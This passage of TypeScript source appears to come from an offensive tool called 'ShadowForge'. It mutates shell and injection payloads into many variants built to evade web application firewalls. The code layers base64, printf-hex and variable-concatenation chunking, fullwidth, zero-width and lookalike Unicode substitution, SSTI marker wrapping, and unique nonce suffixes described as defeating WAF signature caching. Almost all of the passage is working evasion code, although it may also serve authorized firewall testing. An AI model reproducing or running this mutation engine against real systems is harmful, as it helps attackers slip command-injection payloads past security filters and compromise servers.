  let lcg = parseInt(nonce.slice(0, 8), 16) | 1;  // must be odd for full period
  return [...s].map((c) => {
    lcg = Math.imul(lcg, 1664525) + 1013904223;   // Numerical Recipes LCG (32-bit)
    const r = ((lcg >>> 0) & 0xffff) / 0x10000;   // uniform float [0, 1)
    return FULLWIDTH[c] && r < rate ? FULLWIDTH[c]! : c;
  }).join("");
}

/** Insert zero-width chars between every Nth character to break keyword matching */
function injectZeroWidth(s: string, nonce: string, every = 3): string {
  const zwc = ZERO_WIDTH_CHARS[nonce.charCodeAt(0) % ZERO_WIDTH_CHARS.length]!;
  return [...s].map((c, i) => (i > 0 && i % every === 0) ? zwc + c : c).join("");
}

/** Replace shell metacharacters with lookalike Unicode */
function applyLookalikes(s: string, nonce: string): string {
  return [...s].map((c, i) => {
    const alts = LOOKALIKES[c];
    if (alts && alts.length > 0 && nonce.charCodeAt(i % nonce.length) % 3 === 0) {
      return alts[nonce.charCodeAt((i + 1) % nonce.length) % alts.length]!;
    }
    return c;
  }).join("");
}

/* ── SSTI wrapper ────────────────────────────────────────────────────────── */

/** Wrap a payload in nested SSTI markers from randomly-selected engines */
function wrapSsti(payload: string, nonce: string, layers = 2): string {
  let wrapped = payload;
  for (let i = 0; i < layers; i++) {
    const set = SSTI_MARKER_SETS[(nonce.charCodeAt(i) + i) % SSTI_MARKER_SETS.length]!;
    if (set.close) {
      wrapped = `${set.open}${wrapped}${set.close}`;
    } else {
      // self-contained probe marker — append before payload
      wrapped = `${set.open}${wrapped}`;
    }
  }
  return wrapped;
}

/* ── Nonce generator ─────────────────────────────────────────────────────── */
let _nonceCounter = 0;
function makeNonce(seed?: number): string {
  const base = seed !== undefined ? seed : Date.now() + (++_nonceCounter * 0x1337);
  return (base >>> 0).toString(16).padStart(8, "0");
}

/* ── Public API ──────────────────────────────────────────────────────────── */

/**
 * Mutate a single payload using a combination of techniques selected
 * deterministically from the provided seed/nonce.
 *
 * @param payload  The base shell/injection payload to mutate
 * @param seed     Optional numeric seed (uses timestamp+counter if omitted)
 * @returns        A unique MutationVariant ready to inject
 */
export function shadowForgeMutate(payload: string, seed?: number): MutationVariant {
  const nonce      = makeNonce(seed);
  const techniques: string[] = [];
  const selector   = parseInt(nonce.slice(0, 2), 16); // 0-255

  let mutated = payload;

  /* ── Chunked encoding layer ───────────────────────────────── */
  const chunkMode = selector % 3;
  if (chunkMode === 0) {
    mutated     = chunkedConcat(payload, nonce);
    techniques.push("var-concat-chunks");
  } else if (chunkMode === 1) {
    mutated     = b64DecodeChunk(payload, nonce);
    techniques.push("b64-runtime-decode");
  } else {
    mutated     = printfHexChunk(payload);
    techniques.push("printf-hex-chunks");
  }

  /* ── Unicode bypass layer ─────────────────────────────────── */
  const unicodeMode = (selector >> 2) % 3;
  if (unicodeMode === 0) {
    mutated     = applyFullwidthSubstitution(mutated, nonce, 0.35);
    techniques.push("fullwidth-unicode");
  } else if (unicodeMode === 1) {
    mutated     = injectZeroWidth(mutated, nonce, 4);
    techniques.push("zero-width-inject");
  } else {
    mutated     = applyLookalikes(mutated, nonce);
    techniques.push("lookalike-unicode");
  }

  /* ── SSTI marker wrapping ─────────────────────────────────── */
  const sstiLayers = 1 + (selector % 3);    // 1, 2, or 3 layers
  mutated          = wrapSsti(mutated, nonce, sstiLayers);
  techniques.push(`ssti-wrap(${sstiLayers}L)`);

  /* ── Unique nonce suffix to defeat signature caching ──────── */
  // Append a hidden comment / null-byte separator that is unique per probe
  const commentStyle = (selector >> 4) % 4;
  const uniqueTag    = `${nonce}_${(selector * 0x6a09e667 >>> 0).toString(36)}`;
  if (commentStyle === 0) {
    mutated += `#${uniqueTag}`;
    techniques.push("shell-comment-nonce");
  } else if (commentStyle === 1) {
    mutated = `${mutated}<!--${uniqueTag}-->`;
    techniques.push("html-comment-nonce");
  } else if (commentStyle === 2) {
    mutated += `;: #${uniqueTag}`;           // POSIX null command ':'
    techniques.push("null-cmd-nonce");
  } else {
    mutated += `\u200b${uniqueTag}`;          // zero-width space before nonce
    techniques.push("zwsp-nonce");
  }

  const techStr = techniques.join("+");
  return {
    payload:     mutated,
    techniques,
    nonce,
    description: `ShadowForge mutation [${techStr}] — unique probe, defeats WAF signature-cache replay`,
  };
}

/**
 * Generate `count` unique adversarial bypass variants of a given payload.
 * Each variant combines a different set of Unicode bypass, chunked encoding,
 * and SSTI marker techniques — no two probes share the same byte sequence.
 *
 * @param payload  Base injection payload (e.g. a shell command injection string)
 * @param count    Number of unique variants to generate (default: 8)
 * @returns        Array of MutationVariant objects, each with a unique nonce
 */
export function buildMutationVariants(payload: string, count = 8): MutationVariant[] {
  const variants: MutationVariant[] = [];
  const baseTs = Date.now();
  for (let i = 0; i < count; i++) {
    variants.push(shadowForgeMutate(payload, baseTs + i * 0x1000 + i * i));
  }
  return variants;
}

/**
 * Generate a set of adversarial bypass variants from multiple base payloads.
 * Interleaves variants from all base payloads so each WAF probe position
 * rotates across different underlying commands.
 *
 * @param payloads  Array of base payloads to mutate
 * @param perPayload How many variants to generate per base payload (default: 4)
 */
export function buildMutationMatrix(payloads: string[], perPayload = 4): MutationVariant[] {
  const matrix: MutationVariant[] = [];
  const baseTs = Date.now();
  for (let pi = 0; pi < payloads.length; pi++) {
    const base = payloads[pi]!;
    for (let vi = 0; vi < perPayload; vi++) {
      matrix.push(shadowForgeMutate(base, baseTs + pi * 0x10000 + vi * 0x100));
    }
  }
  return matrix;
}

/**
 * Quick helper — return just the mutated payload strings (no metadata).
 * Drop-in replacement for other buildXxx() functions.
 */
export function shadowForgeVariants(payload: string, count = 8): string[] {
  return buildMutationVariants(payload, count).map(v => v.payload);
}
